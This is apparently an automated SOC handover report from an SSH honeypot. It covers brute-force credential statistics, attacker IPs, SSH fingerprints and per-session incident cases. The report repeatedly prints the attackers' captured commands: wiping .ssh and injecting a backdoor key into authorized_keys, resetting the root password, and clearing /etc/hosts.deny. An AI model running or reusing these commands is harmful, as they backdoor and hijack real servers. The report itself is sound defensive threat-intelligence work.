# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T12:57:48Z |
| **Shift Time** | 12:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **270** |
| Confirmed Threats | **266** |
| False Positives Filtered | **4** (1.5%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **10** |
| High Severity Cases | **95** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **175** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **224** |
| Unique Credential Pairs | **108** |
| Unique Usernames | **44** |
| Unique Passwords | **104** |
| Successful Auth Pairs | **59** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 95 |
| `345gs5662d34` | 47 |
| `ubuntu` | 13 |
| `user` | 4 |
| `ali` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 47 |
| `3245gs5662d34` | 46 |
| `123456` | 6 |
| `123` | 3 |
| `root1234@#` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 47 |
| `root` | `3245gs5662d34` | 46 |
| `root` | `root1234@#` | 2 |
| `user` | `martin` | 2 |
| `ftptest` | `ftptest` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root1234@#` | `62.3.56.187` | 2026-04-12T10:36:20 |
| `root` | `3245gs5662d34` | `62.3.56.187` | 2026-04-12T10:36:25 |
| `root` | `Root001..` | `128.1.38.169` | 2026-04-12T10:36:43 |
| `root` | `3245gs5662d34` | `128.1.38.169` | 2026-04-12T10:36:46 |
| `root` | `Root111111!` | `209.141.41.212` | 2026-04-12T10:37:12 |
| `root` | `3245gs5662d34` | `209.141.41.212` | 2026-04-12T10:37:18 |
| `root` | `Ahmed123` | `209.141.41.212` | 2026-04-12T10:37:56 |
| `root` | `Ks123456@` | `62.3.56.187` | 2026-04-12T10:38:04 |
| `root` | `!QAZ2wsx$` | `154.209.4.195` | 2026-04-12T10:38:32 |
| `root` | `ccBB112233` | `69.6.221.248` | 2026-04-12T10:38:34 |
| `root` | `3245gs5662d34` | `154.209.4.195` | 2026-04-12T10:38:35 |
| `root` | `123qweasdZXC` | `209.141.41.212` | 2026-04-12T10:38:39 |
| `root` | `3245gs5662d34` | `69.6.221.248` | 2026-04-12T10:38:42 |
| `root` | `qazwsx11111111!` | `101.47.159.125` | 2026-04-12T10:40:00 |
| `root` | `3245gs5662d34` | `101.47.159.125` | 2026-04-12T10:40:03 |
| `root` | `a123456o` | `69.6.221.248` | 2026-04-12T10:40:23 |
| `root` | `qwertyuiop123456@` | `209.141.41.212` | 2026-04-12T10:40:43 |
| `root` | `test12!` | `209.141.41.212` | 2026-04-12T10:42:55 |
| `root` | `Root2025!` | `209.141.41.212` | 2026-04-12T10:43:41 |
| `root` | `ccBB112233` | `154.209.4.195` | 2026-04-12T10:43:59 |
| `root` | `Qazwsx4321..` | `209.141.41.212` | 2026-04-12T10:45:03 |
| `root` | `Arpit@123` | `209.141.41.212` | 2026-04-12T10:46:30 |
| `root` | `root1234@#` | `101.47.159.125` | 2026-04-12T10:46:40 |
| `root` | `DDcc112233` | `181.23.113.121` | 2026-04-12T10:48:32 |
| `root` | `3245gs5662d34` | `181.23.113.121` | 2026-04-12T10:48:48 |
| `root` | `qazwsx11111111!` | `62.3.56.187` | 2026-04-12T10:49:21 |
| `root` | `Qazwsx8888#` | `62.3.56.187` | 2026-04-12T10:51:01 |
| `root` | `a123456o` | `154.209.4.195` | 2026-04-12T10:54:38 |
| `root` | `hosting` | `101.47.159.125` | 2026-04-12T10:54:55 |
| `root` | `hosting` | `62.3.56.187` | 2026-04-12T10:55:54 |
| `root` | `qwertyuiop123456@` | `181.23.113.121` | 2026-04-12T10:57:30 |
| `root` | `Admin2023` | `62.3.56.187` | 2026-04-12T10:57:35 |
| `root` | `9ol.!@#` | `154.209.4.195` | 2026-04-12T11:00:01 |
| `root` | `2025` | `62.3.56.187` | 2026-04-12T11:00:42 |
| `root` | `2025` | `101.47.159.125` | 2026-04-12T11:01:40 |
| `root` | `Root2021!@#` | `154.209.4.195` | 2026-04-12T11:01:47 |
| `root` | `qazwsx12345@@` | `181.23.113.121` | 2026-04-12T11:02:29 |
| `root` | `Admin2023` | `101.47.159.125` | 2026-04-12T11:03:21 |
| `root` | `Qazwsx12345678` | `154.209.4.195` | 2026-04-12T11:05:23 |
| `root` | `1234-zxcv` | `69.6.221.248` | 2026-04-12T11:05:29 |
| `root` | `XXzz123123` | `185.158.22.150` | 2026-04-12T11:20:34 |
| `root` | `3245gs5662d34` | `185.158.22.150` | 2026-04-12T11:20:39 |
| `root` | `Root999@#` | `115.239.224.92` | 2026-04-12T11:21:29 |
| `root` | `Abc@123.` | `81.193.216.17` | 2026-04-12T11:21:55 |
| `root` | `3245gs5662d34` | `81.193.216.17` | 2026-04-12T11:22:00 |
| `root` | `tk123456` | `14.103.50.32` | 2026-04-12T11:24:23 |
| `root` | `A12345678@` | `172.190.142.151` | 2026-04-12T12:09:18 |
| `root` | `3245gs5662d34` | `172.190.142.151` | 2026-04-12T12:09:23 |
| `root` | `Qwerty123456@` | `172.190.142.151` | 2026-04-12T12:10:56 |
| `root` | `Chen@123` | `172.190.142.151` | 2026-04-12T12:15:59 |
| `root` | `1234@QWERTY` | `180.76.104.44` | 2026-04-12T12:17:13 |
| `root` | `Qazwsx000#` | `172.190.142.151` | 2026-04-12T12:17:38 |
| `root` | `XXbb123123` | `172.190.142.151` | 2026-04-12T12:19:22 |
| `root` | `1qwertyuiop` | `172.190.142.151` | 2026-04-12T12:21:02 |
| `root` | `Qwerty!123` | `172.190.142.151` | 2026-04-12T12:22:42 |
| `root` | `12345-asd` | `172.190.142.151` | 2026-04-12T12:26:01 |
| `root` | `ZAQ!2wsx54321!!` | `172.190.142.151` | 2026-04-12T12:27:42 |
| `root` | `zaq!xsw@` | `172.190.142.151` | 2026-04-12T12:29:19 |
| `root` | `Tt@123456` | `172.190.142.151` | 2026-04-12T12:39:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **270** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 259 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 248 | 15 |
| `17a5327c6d98...` | Mirai/variant | 2 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 248 | 15 | Modern SSH client |
| `95420f9d932d...` | libssh | 11 | 1 | — |
| `17a5327c6d98...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 46 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:WPQRCvzJF5ey"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `115.239.224.92`, `180.76.104.44`, `14.103.50.32`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.158.22.150`, `62.3.56.187`, `81.193.216.17`, `172.190.142.151`, `209.141.41.212`, `154.209.4.195`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **19** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS53667` | FranTech Solutions | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | LOW |
| `AS210513` | Masarat Al-Iraq Information Technology Co., Ltd | 1 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (95)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ff0ee95b06ff

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:36 |
| **Last Seen** | 2026-04-12 10:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:36:18` | `cowrie.session.connect` |
| `2026-04-12 10:36:18` | `cowrie.client.version` |
| `2026-04-12 10:36:19` | `cowrie.client.kex` |
| `2026-04-12 10:36:20` | `cowrie.login.success` |
| `2026-04-12 10:36:20` | `cowrie.session.params` |
| `2026-04-12 10:36:20` | `cowrie.command.input` |
| `2026-04-12 10:36:20` | `cowrie.command.failed` |
| `2026-04-12 10:36:20` | `cowrie.log.closed` |
| `2026-04-12 10:36:21` | `cowrie.session.params` |
| `2026-04-12 10:36:21` | `cowrie.command.input` |
| `2026-04-12 10:36:21` | `cowrie.session.file_download` |
| `2026-04-12 10:36:21` | `cowrie.log.closed` |
| `2026-04-12 10:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86b7f7ff9a7b

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:36 |
| **Last Seen** | 2026-04-12 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:36:24` | `cowrie.session.connect` |
| `2026-04-12 10:36:24` | `cowrie.client.version` |
| `2026-04-12 10:36:24` | `cowrie.client.kex` |
| `2026-04-12 10:36:25` | `cowrie.login.success` |
| `2026-04-12 10:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a498f5f1ae5

| Field | Detail |
|---|---|
| **Source IP** | `128.1.38[.]169` |
| **First Seen** | 2026-04-12 10:36 |
| **Last Seen** | 2026-04-12 10:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:36:43` | `cowrie.session.connect` |
| `2026-04-12 10:36:43` | `cowrie.client.version` |
| `2026-04-12 10:36:43` | `cowrie.client.kex` |
| `2026-04-12 10:36:43` | `cowrie.login.success` |
| `2026-04-12 10:36:44` | `cowrie.session.params` |
| `2026-04-12 10:36:44` | `cowrie.command.input` |
| `2026-04-12 10:36:44` | `cowrie.command.failed` |
| `2026-04-12 10:36:44` | `cowrie.log.closed` |
| `2026-04-12 10:36:44` | `cowrie.session.params` |
| `2026-04-12 10:36:44` | `cowrie.command.input` |
| `2026-04-12 10:36:44` | `cowrie.session.file_download` |
| `2026-04-12 10:36:44` | `cowrie.log.closed` |
| `2026-04-12 10:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.38[.]169` to AbuseIPDB if not already reported
- [ ] Block `128.1.38[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8937fca03362

| Field | Detail |
|---|---|
| **Source IP** | `128.1.38[.]169` |
| **First Seen** | 2026-04-12 10:36 |
| **Last Seen** | 2026-04-12 10:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:36:45` | `cowrie.session.connect` |
| `2026-04-12 10:36:45` | `cowrie.client.version` |
| `2026-04-12 10:36:46` | `cowrie.client.kex` |
| `2026-04-12 10:36:46` | `cowrie.login.success` |
| `2026-04-12 10:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.38[.]169` to AbuseIPDB if not already reported
- [ ] Block `128.1.38[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80a635636c1

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:37 |
| **Last Seen** | 2026-04-12 10:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:37:10` | `cowrie.session.connect` |
| `2026-04-12 10:37:10` | `cowrie.client.version` |
| `2026-04-12 10:37:11` | `cowrie.client.kex` |
| `2026-04-12 10:37:12` | `cowrie.login.success` |
| `2026-04-12 10:37:12` | `cowrie.session.params` |
| `2026-04-12 10:37:12` | `cowrie.command.input` |
| `2026-04-12 10:37:12` | `cowrie.command.failed` |
| `2026-04-12 10:37:13` | `cowrie.log.closed` |
| `2026-04-12 10:37:13` | `cowrie.session.params` |
| `2026-04-12 10:37:13` | `cowrie.command.input` |
| `2026-04-12 10:37:14` | `cowrie.session.file_download` |
| `2026-04-12 10:37:14` | `cowrie.log.closed` |
| `2026-04-12 10:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ab21487ecb

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:37 |
| **Last Seen** | 2026-04-12 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:37:17` | `cowrie.session.connect` |
| `2026-04-12 10:37:17` | `cowrie.client.version` |
| `2026-04-12 10:37:17` | `cowrie.client.kex` |
| `2026-04-12 10:37:18` | `cowrie.login.success` |
| `2026-04-12 10:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993b0f635842

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:37 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:37:54` | `cowrie.session.connect` |
| `2026-04-12 10:37:54` | `cowrie.client.version` |
| `2026-04-12 10:37:55` | `cowrie.client.kex` |
| `2026-04-12 10:37:56` | `cowrie.login.success` |
| `2026-04-12 10:37:56` | `cowrie.session.params` |
| `2026-04-12 10:37:56` | `cowrie.command.input` |
| `2026-04-12 10:37:56` | `cowrie.command.failed` |
| `2026-04-12 10:37:57` | `cowrie.log.closed` |
| `2026-04-12 10:37:57` | `cowrie.session.params` |
| `2026-04-12 10:37:57` | `cowrie.command.input` |
| `2026-04-12 10:37:58` | `cowrie.session.file_download` |
| `2026-04-12 10:37:58` | `cowrie.log.closed` |
| `2026-04-12 10:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a8613ffde5

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:01` | `cowrie.session.connect` |
| `2026-04-12 10:38:01` | `cowrie.client.version` |
| `2026-04-12 10:38:02` | `cowrie.client.kex` |
| `2026-04-12 10:38:03` | `cowrie.login.success` |
| `2026-04-12 10:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1630f80b2f2

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:03` | `cowrie.session.connect` |
| `2026-04-12 10:38:03` | `cowrie.client.version` |
| `2026-04-12 10:38:04` | `cowrie.client.kex` |
| `2026-04-12 10:38:04` | `cowrie.login.success` |
| `2026-04-12 10:38:05` | `cowrie.session.params` |
| `2026-04-12 10:38:05` | `cowrie.command.input` |
| `2026-04-12 10:38:05` | `cowrie.command.failed` |
| `2026-04-12 10:38:05` | `cowrie.log.closed` |
| `2026-04-12 10:38:06` | `cowrie.session.params` |
| `2026-04-12 10:38:06` | `cowrie.command.input` |
| `2026-04-12 10:38:06` | `cowrie.session.file_download` |
| `2026-04-12 10:38:06` | `cowrie.log.closed` |
| `2026-04-12 10:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7e677eeeb3

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:09` | `cowrie.session.connect` |
| `2026-04-12 10:38:09` | `cowrie.client.version` |
| `2026-04-12 10:38:09` | `cowrie.client.kex` |
| `2026-04-12 10:38:10` | `cowrie.login.success` |
| `2026-04-12 10:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92f11e3532f

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
